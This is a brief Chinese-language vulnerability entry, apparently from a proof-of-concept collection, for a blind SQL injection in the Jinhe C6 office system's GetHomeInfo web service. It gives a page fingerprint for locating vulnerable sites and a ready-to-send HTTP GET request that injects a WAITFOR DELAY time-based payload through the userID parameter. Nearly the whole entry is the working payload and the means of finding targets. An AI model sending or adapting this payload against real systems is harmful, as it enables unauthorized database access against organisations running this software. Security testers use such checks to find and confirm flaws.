﻿# 金和C6 gethomeinfo sql注入

> 更新时间：2023-12-31

> 漏洞编号：

> 漏洞说明：金和C6 gethomeinfo 存在sql盲注

> 漏洞特征：body="JHSoft.Web.AddMenu" 

> 验证脚本：HTTP

```
GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：金和C6 gethomeinfo sql注入.poc
